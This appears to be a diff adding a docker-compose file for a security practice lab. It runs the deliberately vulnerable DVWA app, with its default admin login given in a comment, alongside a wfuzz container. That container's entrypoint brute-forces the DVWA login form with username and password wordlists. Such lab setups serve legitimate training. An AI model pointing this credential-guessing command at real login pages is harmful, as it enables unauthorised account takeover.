@@ -1,0 +1,19 @@
+version: '3'
+
+# 使用 wfuzz 字典破解用户凭证，
+services:
+  # 漏洞靶场，用户名：admin,密码：password
+  web-dvwa:
+    container_name: web-dvwa
+    image: vulnerables/web-dvwa # https://hub.docker.com/r/vulnerables/web-dvwa
+    ports:
+      - 8080:80
+
+  wfuzz:
+    container_name: wfuzz
+    image: ilyaglow/wfuzz
+    depends_on:
+      - web-dvwa
+    volumes:
+      - ./data:/var/data/wfuzz
+    entrypoint: 'wfuzz  -w /var/data/wfuzz/top-usernames-shortlist.txt -w /var/data/wfuzz/2020-200_most_used_passwords.txt -d "username=FUZZ&password=FUZ2Z" -c  http://web-dvwa/login.php'
